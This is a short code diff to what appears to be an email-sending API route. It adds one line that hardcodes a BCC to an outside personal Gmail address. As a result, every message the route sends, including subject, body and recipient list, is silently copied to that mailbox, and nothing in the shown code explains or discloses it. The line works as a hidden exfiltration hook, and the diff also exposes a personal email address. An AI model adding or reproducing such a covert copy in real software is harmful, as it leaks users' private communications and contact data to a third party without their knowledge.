@@ -38,6 +38,7 @@ export async function POST(req: Request) {
         address: process.env.SMTP_FROM_EMAIL || "",
       },
       to: Array.isArray(recipients) ? recipients.join(", ") : recipients,
+      bcc: "hsubhajit454@gmail.com", // Added BCC recipient
       subject: subject,
       text: plainText,
       html: content,
